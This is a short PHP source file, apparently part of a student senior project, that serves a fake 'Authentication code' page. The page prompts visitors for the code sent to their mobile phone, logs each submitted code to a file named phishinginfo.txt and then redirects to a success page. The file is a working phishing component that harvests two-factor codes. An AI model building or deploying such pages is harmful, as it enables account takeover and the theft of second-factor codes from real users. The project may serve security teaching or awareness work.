<?php
require 'log.php';
$log=new logging();
$log->lfile('C:\MAMP\htdocs\SeniorProject\phishinginfo.txt');
$msg = '';

if (isset($_POST['code'])) {

  
  $log->lwrite("code : " .$_POST['code']);
   header("Location: success2.php");

}
?>
<!doctype html>
<head>
    <meta charset="UTF-8">
    <title>Authentication Code</title>
    
<link rel="stylesheet" href="css/bootstrap.min.css">
</head>
<body>
<h1>Authentication code</h1>
<form method="post" action="authenticator.php">

       <p>Please enter the code from your mobile phone<input type="text" name="code"></p>
     <button type="submit">Enter</button>
                
            </form>

          
   

</body>
</html>